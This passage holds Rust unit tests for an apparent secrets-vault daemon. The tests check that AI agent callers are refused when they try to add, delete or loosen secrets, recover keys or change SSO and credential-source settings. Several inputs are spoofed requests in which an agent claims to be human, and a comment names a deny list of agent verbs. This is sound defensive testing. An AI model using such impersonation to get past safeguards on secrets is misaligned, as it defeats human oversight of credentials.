            start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(), limit_minutes: Some(15), accounts: Default::default() });
        store::save_config(&p, &cfg).unwrap();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        let st = Ctx::new(State::default());
        let r = handle_as(&p, &st, agent::Peer::default(), Req::SsoPortalLimit { portal: "main".into(), minutes: Some(30) }, 0, None, |response| {
            assert_eq!(response, json!(false));
            assert_eq!(store::load_config(&p)?.sso_portals["main"].limit_minutes, Some(30));
            let events = crate::audit::read(&p, usize::MAX)?;
            assert_eq!(events.last().unwrap()["action"], "sso-limit");
            assert_eq!(events.last().unwrap()["phase"], "intent");
            bail!("synthetic delivery failure")
        });
        assert!(r.unwrap_err().to_string().contains("delivery failure"));
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        assert_eq!(events.last().unwrap()["phase"], "outcome");
        assert_eq!(events.last().unwrap()["ok"], false);
        crate::audit::fail_phase(Some("all"));
        let r = handle_as(&p, &st, agent::Peer::default(), Req::SsoPortalLimit { portal: "main".into(), minutes: Some(15) }, 0, None, Ok);
        crate::audit::fail_phase(None);
        r.unwrap();
        assert_eq!(store::load_config(&p).unwrap().sso_portals["main"].limit_minutes, Some(15));
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn whole_helper_inventory_is_daemon_only() {
        let verbs = ["keygen", "addkey_agent", "pubkeys", "ecdh", "auth", "selftest", "clip", "screen_locked"];
        for (path, source) in [("cli/main.rs", include_str!("../../cli/src/main.rs")),
            ("gui/main.rs", include_str!("../../../app/src-tauri/src/main.rs"))] {
            for verb in verbs { assert!(!source.contains(&format!("helper::{verb}(")), "{path}: {verb}"); }
        }
        // Parse the complete production library method inventory and propagate helper
        // reachability through local method calls. Public client methods must never
        // reach a spawn-capable primitive; pub(crate) daemon internals are intentional.
        let lib = include_str!("lib.rs").split("mod proof_tests {").next().unwrap();
        let mut methods: Vec<(&str, bool, String)> = vec![];
        for line in lib.lines() {
            let line = line.trim();
            if let Some((prefix, tail)) = line.split_once("fn ") {
                let name = tail.split(['(', '<']).next().unwrap();
                methods.push((name, prefix == "pub ", String::new()));
            }
            if let Some((_,_,body)) = methods.last_mut() { body.push_str(line); body.push('\n'); }
        }
        let mut reachable: std::collections::HashSet<&str> = methods.iter().filter(|(_,_,body)|
            verbs.iter().any(|verb| body.contains(&format!("helper::{verb}(")))).map(|(name,_,_)| *name).collect();
        loop {
            let before = reachable.len();
            for (name,_,body) in &methods {
                if reachable.iter().any(|callee| body.contains(&format!(".{callee}("))) { reachable.insert(name); }
            }
            if before == reachable.len() { break; }
        }
        for (name, public, _) in methods { assert!(!public || !reachable.contains(name), "client method {name} reaches helper"); }
        let helper = include_str!("helper.rs");
        for verb in verbs {
            assert!(helper.contains(&format!("pub(crate) fn {verb}(")), "spawn capability visibility: {verb}");
            assert!(!helper.contains(&format!("pub fn {verb}(")));
        }
        assert!(include_str!("../../cli/src/main.rs").contains("v.copy(&name)"));
        assert!(include_str!("../../../app/src-tauri/src/main.rs").contains("v.copy(&name)"));
    }

    #[test]
    fn unlock_clients_have_no_direct_auth_or_ecdh() {
        let lib = include_str!("lib.rs");
        let client = lib.split("pub fn unlock(").nth(1).unwrap().split("pub(crate) fn unlock_internal(").next().unwrap();
        for source in [client, include_str!("../../cli/src/main.rs")] {
            for verb in ["auth", "ecdh"] { assert!(!source.contains(&format!("helper::{verb}("))); }
        }
        assert!(!client.contains("unwrap_deks("));
        let internal = lib.split("pub(crate) fn unlock_internal(").nth(1).unwrap().split("// ---------- leases").next().unwrap();
        assert!(!internal.contains("daemon::request("), "nested unlock operations must not self-RPC");
        assert!(!include_str!("../../cli/src/main.rs").contains("Req::SsoOpen"));
    }
}

#[cfg(test)]
mod mutation_routing_tests {
    use super::*;
    use crate::{platform::helper, Tier};
    use std::{cell::Cell, rc::Rc};

    fn fixture(label: &str) -> Paths {
        let p = super::unlock_routing_tests::fixture(label);
        let v = peer_vault(&p, &agent::Peer::default()).unwrap();
        let f = v.build_file("test/bio", Tier::Bio, false, false, &crate::crypto::new_dek(), b"synthetic", &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&p, &f).unwrap();
        p
    }

    fn agent_config(p: &Paths) {
        let mut cfg = store::load_config(p).unwrap();
        cfg.agent_env_markers.push(agent::SYNTHETIC_AGENT_MARKER.into());
        store::save_config(p, &cfg).unwrap();
    }

    fn counters() -> Rc<Cell<usize>> {
        let calls = Rc::new(Cell::new(0));
        let c = calls.clone();
        helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_,_| { c.set(c.get()+1); bail!("unexpected call_at") })));
        let c = calls.clone();
        helper::KEYGEN_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get()+1); bail!("unexpected keygen") })));
        let c = calls.clone();
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get()+1); bail!("unexpected ecdh") })));
        let c = calls.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { c.set(c.get()+1); bail!("synthetic auth refused") })));
        calls
    }
    fn clear() {
        helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
        helper::KEYGEN_HOOK.with(|h| h.borrow_mut().take());
        helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
    }

    #[test]
    fn raw_mutations_ignore_wire_human_and_refuse_agent_relaxations_before_helper() {
        let p = fixture("mutations-agent");
        agent_config(&p);
        let calls = counters();
        let st = Ctx::new(State::default());
        for wire in [
            json!({"op":"add", "name":"test/new", "value":B64.encode(b"synthetic"), "tier":"open", "agent_allowed":true,"public":false,"overwrite":false}),
            json!({"op":"change_policy", "patterns":["test/bio"],"tier":"open","agent_allowed":true}),
            json!({"op":"change_config", "key":"default-tier", "value":"off"}),
            json!({"op":"upgrade_keys"}),
        ] {
            let mut wire = wire;
            wire["caller"] = json!({"agent":null,"chain":["human"]});
            wire["human"] = json!(true);
            let req = serde_json::from_value(wire).unwrap();
            assert!(handle(&p, &st, std::process::id() as i32, req, 0).is_err());
            assert_eq!(calls.get(), 0, "agent relaxation reached helper");
        }
        assert!(!p.secret("test/new").unwrap().exists());
        assert_eq!(store::load_secret(&p, "test/bio").unwrap().tier, Tier::Bio);
        clear();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn raw_recovery_ignores_wire_human_and_refuses_agents_before_helper() {
        let p = fixture("recovery-agent");
        let (identity, recipient) = crate::crypto::generate_backup_identity();
        let mut v = peer_vault(&p, &agent::Peer::default()).unwrap();
        v.cfg.backup_recipient = Some(recipient.clone());
        let f = v.build_file("test/paper", Tier::Bio, false, false, &crate::crypto::new_dek(), b"synthetic", &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&p, &f).unwrap();
        agent_config(&p);
        let calls = counters();
        let st = Ctx::new(State::default());
        for wire in [
            json!({"op":"recover", "identity_text":identity.as_str()}),
            json!({"op":"recover_from_paper", "identity_text":identity.as_str()}),
            json!({"op":"retire_keys"}),
            json!({"op":"retire_keys_with_paper", "identity_text":identity.as_str()}),
            json!({"op":"rotate_backup", "recipient":recipient}),
        ] {
            let mut wire = wire;
            wire["caller"] = json!({"agent":null,"chain":["human"]});
            wire["human"] = json!(true);
            let req = serde_json::from_value(wire).unwrap();
            let error = handle(&p, &st, std::process::id() as i32, req, 0).unwrap_err();
            assert_eq!(calls.get(), 0, "agent recovery operation reached helper");
            assert!(error.to_string().contains("agent"), "{error}");
        }
        assert_eq!(serde_json::to_value(store::load_secret(&p, "test/paper").unwrap()).unwrap(), serde_json::to_value(f).unwrap());
        assert!(p.initialized());
        assert!(!p.root.join("keys.retirement").exists());
        clear();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    struct SsoHooks;
    impl Drop for SsoHooks { fn drop(&mut self) { clear(); } }

    #[test]
    fn raw_sso_mutations_refuse_agents_before_any_helper() {
        let _hooks = SsoHooks;
        let p = fixture("sso-agent");
        let mut cfg = store::load_config(&p).unwrap();
        cfg.sso_portals.insert("main".into(), store::SsoPortal {
            start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(), limit_minutes: Some(15), accounts: Default::default() });
        store::save_config(&p, &cfg).unwrap();
        agent_config(&p);
        let before = std::fs::read(p.config()).unwrap();
        let calls = counters();
        let st = Ctx::new(State::default());
        for wire in [
            json!({"op":"sso_portal_add","name":"new","start_url":"https://example.awsapps.com/start","region":"us-east-1"}),
            json!({"op":"sso_portal_limit","portal":"main","minutes":60}),
            json!({"op":"refresh_sso_registrations","names":["aws/x"]}),
        ] {
            let mut wire = wire;
            wire["caller"] = json!({"agent":null});
            let result = handle(&p, &st, std::process::id() as i32, serde_json::from_value(wire).unwrap(), 0);
            assert_eq!(calls.get(), 0, "agent SSO mutation reached helper");
            assert!(result.unwrap_err().to_string().contains("agent"));
        }
        assert_eq!(std::fs::read(p.config()).unwrap(), before);
        clear();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn wire_sso_dek_and_registration_authority_are_retired() {
        for wire in [
            json!({"op":"sso_open","name":"aws/x","dek":B64.encode([7u8;32]),"ttl":60}),
            json!({"op":"sso_open","name":"aws/x","dek":null,"ttl":60}),
            json!({"op":"sso_register","profiles":[]}),
            json!({"op":"sso_register","profiles":[{"name":"aws/x","dek_sha256":"00".repeat(32)}]}),
        ] {
            assert!(serde_json::from_value::<Req>(wire).is_err(), "legacy authority must be rejected by parser");
        }
    }

    #[test]
    fn sso_clients_only_send_semantic_intent() {
        let lib = include_str!("lib.rs");
        for (start, end) in [
            ("pub fn sso_portal_add(", "pub(crate) fn sso_portal_add_internal("),
            ("pub fn sso_portal_limit(", "pub(crate) fn sso_portal_limit_internal("),
            ("fn sso_sync(", "fn sso_sync_internal("),
            ("pub fn sso_login(", "pub fn sso_logout("),
        ] {
            let body = lib.split(start).nth(1).unwrap().split(end).next().unwrap();
            assert!(body.contains("daemon::request("));
            for prohibited in ["helper::", "sso_regs", "unwrap_deks", "Req::SsoRegister", "Req::SsoSet"] {
                assert!(!body.contains(prohibited), "{start}: {prohibited}");
            }
        }
        let internal = lib.split("pub(crate) fn sso_portal_limit_internal(").nth(1).unwrap().split("pub fn add_aws_sso(").next().unwrap();
        assert!(!internal.contains("daemon::running("));
        assert!(!internal.contains("daemon::request("));
    }

    #[test]
    fn raw_agent_delete_is_categorically_refused_before_auth_and_preserves_files() {
        // `rm` is in AGENT_DENIED_VERBS. Previously an agent delete reached a Touch ID
        // prompt (Prompt::Delete); now the daemon refuses it before any prompt or effect.
        let p = fixture("mutations-delete");
        agent_config(&p);
        let calls = counters();
        let st = Ctx::new(State::default());
        let err = handle(&p, &st, std::process::id() as i32, Req::Delete { patterns: vec!["test/bio".into()] }, 0).unwrap_err();
        assert_eq!(err.to_string(), crate::fence::refusal("removing a secret", &agent::detect_peer(&store::load_config(&p).unwrap(), std::process::id() as i32).caller.agent.unwrap()));
        assert_eq!(calls.get(), 0, "delete must reach no helper seam, including auth");
        assert!(p.secret("test/bio").unwrap().exists());
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        assert!(events.iter().any(|e| e["action"] == "daemon-delete" && e["phase"] == "intent"));
        assert!(events.iter().any(|e| e["action"] == "daemon-delete" && e["phase"] == "outcome" && e["ok"] == false));
        assert!(!events.iter().any(|e| e["action"] == "rm"), "the delete operation itself must not start");
        clear(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn policy_tightening_revokes_leases_for_human_and_agent_without_self_rpc() {
        for is_agent in [false, true] {
            let p = fixture(if is_agent { "mutations-tighten-agent" } else { "mutations-tighten-human" });
            let v = peer_vault(&p, &agent::Peer::default()).unwrap();
            let f = v.build_file("test/open", Tier::Open, true, false, &crate::crypto::new_dek(), b"synthetic", &v.pubkeys_local().unwrap(), None).unwrap();
            store::save_secret(&p, &f).unwrap();
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
            helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|reqs| {
                let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                reqs.iter().map(|(_,eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            REQUEST_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_,_| panic!("daemon must not self-RPC"))));
            let st = Ctx::new(State::default());
            handle_as(&p, &st, agent::Peer::default(), Req::GrantLease { names: vec!["test/open".into()], grantee: Grantee::Any, hours: 1.0, scope: Scope::default() }, 0, None, Ok).unwrap();
            assert!(st.lock().unwrap().leases.contains_key("test/open"));
            let mut peer = agent::Peer::default();
            if is_agent { peer.caller.agent = Some("synthetic".into()); }
            helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|reqs| {
                let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                reqs.iter().map(|(_,eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            handle_as(&p, &st, peer, Req::ChangePolicy { patterns: vec!["test/open".into()], tier: Some(Tier::Bio), agent_allowed: Some(false), public: None }, 0, None, Ok).unwrap();
            assert!(!st.lock().unwrap().leases.contains_key("test/open"), "tightening must revoke");
            assert_eq!(store::load_secret(&p, "test/open").unwrap().tier, Tier::Bio);
            REQUEST_HOOK.with(|h| h.borrow_mut().take());
            clear(); std::fs::remove_dir_all(p.root).unwrap();
        }
    }

    #[test]
    fn mutation_clients_have_no_helper_calls_and_internals_have_no_self_rpc() {
        let lib = include_str!("lib.rs");
        for name in ["add", "set_policy", "remove", "set_config", "upgrade_keys", "recover", "recover_from_paper", "retire_keys", "retire_keys_with_paper", "rotate_backup"] {
            let client = lib.split(&format!("pub fn {name}(" )).nth(1).unwrap().split(&format!("pub(crate) fn {name}_internal(")).next().unwrap();
            assert!(client.contains("daemon::request("), "{name}");
            assert!(!client.contains("helper::"), "{name}");
            let internal = lib.split(&format!("pub(crate) fn {name}_internal(")).nth(1).unwrap().split("\n    }").next().unwrap();
            for prohibited in ["daemon::request(", "daemon::running(", "self.pubkeys()", "self.unwrap_deks(", "self.sso_sync("] {
                assert!(!internal.contains(prohibited), "{name}: {prohibited}");
            }
        }
        for name in ["end_leases_internal", "sso_sync_internal", "rewrap_from_paper"] {
            let internal = lib.split(&format!("fn {name}(")).nth(1).unwrap().split("\n    }").next().unwrap();
            assert!(!internal.contains("daemon::request("));
            assert!(!internal.contains("self.pubkeys()"));
        }
        let cli = include_str!("../../cli/src/main.rs");
        assert!(cli.contains("v.recover_from_paper(&text, &accept_loss)?"));
        assert!(cli.contains("v.rotate_backup(&recip)?"));
        assert!(!cli.contains("helper::keygen("));
    }
}

// Kept in tests/ so the production source scan can prove no fake adapter is linked.
#[cfg(test)]
#[macro_use]
#[path = "../tests/backend_daemon.rs"]
mod backend_daemon_tests;

#[cfg(test)]
mod capability_fence_tests {
    use super::*;
    use crate::fence::{self, Layer, Verb};
    use crate::{Tier, helper};
    use std::{cell::Cell, rc::Rc};

    fn source_context() -> Ctx {
        let mut registry = crate::backend::Registry::default();
        registry.register("fake", |_| Err(crate::backend::BackendError::Unsupported)).unwrap();
        Ctx { state: Mutex::new(State::default()), backends: Backends { registry: Arc::new(registry), ..Default::default() } }
    }

    fn agent_peer() -> agent::Peer {
        agent::Peer { pid: std::process::id() as i32, caller: agent::Caller { agent: Some("synthetic".into()), ..Default::default() }, ..Default::default() }
    }

    fn human_peer() -> agent::Peer {
        agent::Peer { pid: std::process::id() as i32, ..Default::default() }
    }

    fn fixture(label: &str) -> Paths {
        let p = super::unlock_routing_tests::fixture(label);
        let v = peer_vault(&p, &agent::Peer::default()).unwrap();
        let pk = v.pubkeys_local().unwrap();
        for (name, tier, allowed) in [("test/bio", Tier::Bio, false), ("test/agentok", Tier::Open, true)] {
            let f = v.build_file(name, tier, allowed, false, &crate::crypto::new_dek(), b"synthetic", &pk, None).unwrap();
            store::save_secret(&p, &f).unwrap();
        }
        p
    }

    /// Any helper seam use is a failure; the AUTH hook counts and refuses.
    fn forbid_helpers() -> Rc<Cell<usize>> {
        let calls = Rc::new(Cell::new(0));
        let c = calls.clone();
        helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_, _| { c.set(c.get() + 1); bail!("unexpected call_at") })));
        let c = calls.clone();
        helper::KEYGEN_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get() + 1); bail!("unexpected keygen") })));
        let c = calls.clone();
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get() + 1); bail!("unexpected ecdh") })));
        let c = calls.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { c.set(c.get() + 1); bail!("synthetic auth refused") })));
        calls
    }

    fn clear_hooks() {
        helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
        helper::KEYGEN_HOOK.with(|h| h.borrow_mut().take());
        helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
    }

    fn session() -> crate::sso::Session {
        crate::sso::Session {
            portal: "main".into(), start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(),
            client_id: "synthetic".into(), client_secret: "synthetic".into(), client_expires_at: now() + 3600,
            access_token: "synthetic".into(), access_issued_at: now(), access_expires_at: now() + 3600,
            refresh_token: None, signed_in_at: now(), renew_until: None,
        }
    }

    fn source_requests() -> Vec<(Verb, Req)> {
        vec![
            (Verb::SourceAdd, Req::SourceAdd { name: "f".into(), kind: "fake".into(), endpoint: "https://fake.invalid/".into(), auth_method: "token".into(), policy: json!({}), credential: SourceCredential(Zeroizing::new("synthetic-source-input".into())) }),
            (Verb::SourceRemove, Req::SourceRemove { name: "f".into() }),
            (Verb::SourceRetarget, Req::SourceRetarget { name: "f".into(), endpoint: Some("https://other.invalid/".into()), credential: None, policy: None }),
            (Verb::SourceList, Req::SourceList),
        ]
    }

    #[test]
    fn source_verbs_fenced_at_both_layers_and_missing_sources_fail_closed() {
        let p = fixture("source-fence");
        let st = source_context();
        let calls = forbid_helpers();
        for (verb, req) in source_requests() {
            assert!(fence::agent_denied(verb, Layer::Cli));
            assert!(fence::agent_denied(verb, Layer::Daemon));
            assert!(fence::require_human(&agent_peer().caller, verb, Layer::Cli).is_err());
            assert_eq!(fence::request_verb(&req), Some(verb));
            let before = snapshot(&p, &st);
            let error = handle_as(&p, &st, agent_peer(), req, 0, None, Ok).unwrap_err();
            assert!(error.to_string().contains("human-only"));
            assert!(snapshot(&p, &st) == before);
        }
        let denied = handle_as(&p, &st, agent_peer(), Req::Resolve {
            reference: "f:ok/a".into(), grant: None, context: None,
        }, 0, None, Ok).unwrap_err();
        assert_eq!(denied.to_string(), crate::backend::BackendError::NeedsHuman.to_string());
        let req = Req::Resolve { reference: "f:ok/a".into(), grant: Some("untrusted-selector".into()), context: None };
        let before = snapshot(&p, &st);
        let error = handle_as(&p, &st, human_peer(), req, 0, None, Ok).unwrap_err();
        assert_eq!(error.to_string(), crate::backend::BackendError::NotFound.to_string());
        assert!(snapshot(&p, &st) == before);
        assert_eq!(calls.get(), 0);
        clear_hooks();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    backend_daemon_tests!();

    fn source_add_request() -> Req { source_requests().remove(0).1 }

    fn source_approve(p: &Paths) {
        let paths = p.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            assert!(crate::audit::current_intent().is_some());
            let events = crate::audit::read(&paths, usize::MAX)?;
            assert!(events.last().unwrap().to_string().contains("intent"));
            Ok(())
        })));
    }

    fn source_plaintext(p: &Paths) -> Zeroizing<Vec<u8>> {
        source_plaintext_at(p, "sources/f/cred")
    }

    fn source_plaintext_at(p: &Paths, name: &str) -> Zeroizing<Vec<u8>> {
        let f = store::load_secret(p, name).unwrap();
        let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
        let eph = p256::PublicKey::from_sec1_bytes(&B64.decode(&f.eph).unwrap()).unwrap();
        let shared = p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), eph.as_affine());
        let pk = peer_vault(p, &human_peer()).unwrap().pubkeys_local().unwrap();
        let dek = crate::crypto::unwrap_dek(&f, shared.raw_secret_bytes(), &pk.bio).unwrap();
        crate::crypto::open(&dek, &f).unwrap()
    }

    #[test]
    fn source_change_config_preserves_concurrent_add_and_retarget() {
        for retarget in [false, true] {
            let p = fixture("source-config-race");
            let st = source_context();
            if retarget {
                source_approve(&p);
                handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
            }
            let paths = p.clone();
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                source_approve(&paths);
                let req = if retarget { Req::SourceRetarget { name: "f".into(), endpoint: None, credential: None, policy: Some(json!({"new":1})) } } else { source_add_request() };
                handle_as(&paths, &source_context(), human_peer(), req, 0, None, Ok)?;
                Ok(())
            })));
            handle_as(&p, &st, human_peer(), Req::ChangeConfig { key: "default-tier".into(), value: "open".into() }, 0, None, Ok).unwrap();
            let cfg = store::load_config(&p).unwrap();
            assert_eq!(cfg.default_tier, Tier::Open);
            assert!(cfg.sources.contains_key("f"));
            if retarget { assert_eq!(cfg.sources["f"].policy, json!({"new":1})); }
            clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
        }
    }

    #[test]
    fn source_rotation_rejects_source_changes_after_snapshot() {
        for change in ["retarget", "remove", "add", "orphan", "config-only"] {
            let p = fixture("source-rotation-race");
            let st = source_context();
            source_approve(&p);
            handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
            let paths = p.clone();
            helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
                source_approve(&paths);
                match change {
                    "orphan" => {
                        let path = paths.secret("sources/orphan/cred")?;
                        std::fs::create_dir_all(path.parent().unwrap())?;
                        std::fs::write(path, b"malformed synthetic envelope")?;
                    }
                    "config-only" => {
                        let lock = store::lock_config(&paths)?;
                        let mut cfg = lock.load()?;
                        let mut source = cfg.sources["f"].clone();
                        source.name = "g".into();
                        source.credential_ref = "sources/g/cred".into();
                        cfg.sources.insert("g".into(), source);
                        lock.save(&cfg)?;
                    }
                    _ => {
                        let req = match change {
                            "remove" => Req::SourceRemove { name: "f".into() },
                            "add" => { let mut req = source_add_request(); if let Req::SourceAdd { name, .. } = &mut req { *name = "g".into(); } req },
                            _ => Req::SourceRetarget { name: "f".into(), endpoint: None, policy: None, credential: Some(SourceCredential(Zeroizing::new("synthetic-C1".into()))) },
                        };
                        handle_as(&paths, &source_context(), human_peer(), req, 0, None, Ok)?;
                    }
                }
                let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                reqs.iter().map(|(_, eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            let recipient = age::x25519::Identity::generate().to_public().to_string();
            let error = handle_as(&p, &st, human_peer(), Req::RotateBackup { recipient }, 0, None, Ok).unwrap_err();
            assert!(error.to_string().contains("maintenance"));
            assert!(store::load_config(&p).unwrap().backup_recipient.is_none());
            match change {
                "remove" => assert!(!p.secret("sources/f/cred").unwrap().exists()),
                "retarget" => assert_eq!(&*source_plaintext(&p), b"synthetic-C1"),
                "add" => {
                    assert!(store::load_config(&p).unwrap().sources.contains_key("g"));
                    assert!(store::load_secret(&p, "sources/g/cred").unwrap().backup.is_none());
                    assert_eq!(&*source_plaintext_at(&p, "sources/g/cred"), b"synthetic-source-input");
                    assert!(store::load_secret(&p, "sources/f/cred").unwrap().backup.is_none());
                    assert_eq!(&*source_plaintext(&p), b"synthetic-source-input");
                }
                _ => assert_eq!(&*source_plaintext(&p), b"synthetic-source-input"),
            }
            clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
        }
    }

    #[test]
    fn source_maintenance_snapshot_rejects_binding_change_without_envelope_change() {
        let p = fixture("source-maintenance-binding");
        let st = source_context();
        source_approve(&p);
        handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
        let snapshot = crate::MaintenanceSnapshot::load(&p).unwrap();
        source_approve(&p);
        handle_as(&p, &st, human_peer(), Req::SourceRetarget { name: "f".into(), endpoint: None, credential: None, policy: Some(json!({"allow":false})) }, 0, None, Ok).unwrap();
        let lock = store::lock_config(&p).unwrap();
        let file = snapshot.files.iter().find(|f| f.name == "sources/f/cred").unwrap();
        assert!(snapshot.check_file(&p, &lock.load().unwrap(), file).unwrap_err().to_string().contains("maintenance source changed"));
        drop(lock);
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_prompt_wire_is_lossless_and_policy_bound() {
        let p = fixture("source-prompt-wire");
        let st = source_context();
        source_approve(&p);
        handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
        let old = store::load_config(&p).unwrap().sources["f"].clone();
        let mut new = old.clone(); new.policy = json!({"allow":false});
        let wire: Value = serde_json::from_str(&source_retarget_prompt(&old, &new).wire()).unwrap();
        assert_eq!(wire["params"][5], old.auth_method);
        assert_ne!(wire["params"][7], wire["params"][8]);
        assert_eq!(wire["params"][9], "unchanged");
        let calls = forbid_helpers();
        for suffix in ["a", "b"] {
            let endpoint = format!("https://fake.invalid/{}{suffix}", "x".repeat(120));
            assert!(handle_as(&p, &st, human_peer(), Req::SourceRetarget { name: "f".into(), endpoint: Some(endpoint), credential: None, policy: None }, 0, None, Ok).unwrap_err().to_string().contains("invalid source metadata"));
        }
        assert_eq!(calls.get(), 0);
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        let intent = events.iter().find(|e| e["action"] == "source-mutation" && e["phase"] == "intent").unwrap();
        assert_eq!(intent["detail"]["kind"], "fake");
        assert!(intent["detail"]["old_binding_hash"].is_null());
        assert_eq!(intent["detail"]["new_binding_hash"], json!(old.binding_hash().unwrap()));
        let result = events.iter().find(|e| e["action"] == "source-mutation-result").unwrap();
        assert_eq!(result["detail"]["generation"], old.generation);
        assert!(!serde_json::to_string(&events).unwrap().contains("synthetic-source-input"));
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    fn assert_source_binding_audit(p: &Paths, old: Option<&crate::backend::SourceConfig>, new: Option<&crate::backend::SourceConfig>) {
        let events = crate::audit::read(p, usize::MAX).unwrap();
        let intent = events.iter().rev().find(|e| e["action"] == "source-mutation" && e["phase"] == "intent").unwrap();
        assert_eq!(intent["detail"]["old_binding_hash"], json!(old.map(|s| s.binding_hash().unwrap())));
        assert_eq!(intent["detail"]["new_binding_hash"], json!(new.map(|s| s.binding_hash().unwrap())));
        let result = events.iter().rev().find(|e| e["action"] == "source-mutation-result").unwrap();
        assert_eq!(result["detail"]["generation"], new.or(old).unwrap().generation);
    }

    #[test]
    fn source_retarget_uses_recipient_reloaded_after_rotation() {
        let p = fixture("source-recipient-race");
        let st = source_context();
        let a = age::x25519::Identity::generate();
        let b = age::x25519::Identity::generate();
        let mut cfg = store::load_config(&p).unwrap();
        cfg.backup_recipient = Some(a.to_public().to_string());
        store::save_config(&p, &cfg).unwrap();
        source_approve(&p);
        handle_as(&p, &st, human_peer(), source_add_request(), 0, None, Ok).unwrap();
        let original = store::load_secret(&p, "sources/f/cred").unwrap();
        assert!(crate::crypto::backup_unwrap(original.backup.as_ref().unwrap(), &a).is_ok());
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|reqs| {
            let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
            reqs.iter().map(|(_, eph)| {
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
        let paths = p.clone();
        let recipient = b.to_public().to_string();
        let expected = recipient.clone();
        BEFORE_SOURCE_LOCK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            // Retarget already loaded A; rotation commits B before it takes ConfigLock.
            handle_as(&paths, &source_context(), human_peer(), Req::RotateBackup { recipient }, 0, None, Ok).unwrap();
        })));
        source_approve(&p);
        handle_as(&p, &st, human_peer(), Req::SourceRetarget { name: "f".into(), endpoint: None, policy: None,
            credential: Some(SourceCredential(Zeroizing::new("synthetic-C1".into()))) }, 0, None, Ok).unwrap();
        assert_eq!(store::load_config(&p).unwrap().backup_recipient, Some(expected));
        let replacement = store::load_secret(&p, "sources/f/cred").unwrap();
        let backup = replacement.backup.as_ref().unwrap();
        let dek = crate::crypto::backup_unwrap(backup, &b).expect("replacement must use committed recipient B");
        assert_eq!(&*crate::crypto::open(&dek, &replacement).unwrap(), b"synthetic-C1");
        assert!(crate::crypto::backup_unwrap(backup, &a).is_err());
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn source_transactions_encrypt_rotate_remove_and_rollback() {
        let p = fixture("source-transactions");
        let st = source_context();
        let send = |req| handle_as(&p, &st, human_peer(), req, 0, None, Ok);
        source_approve(&p);
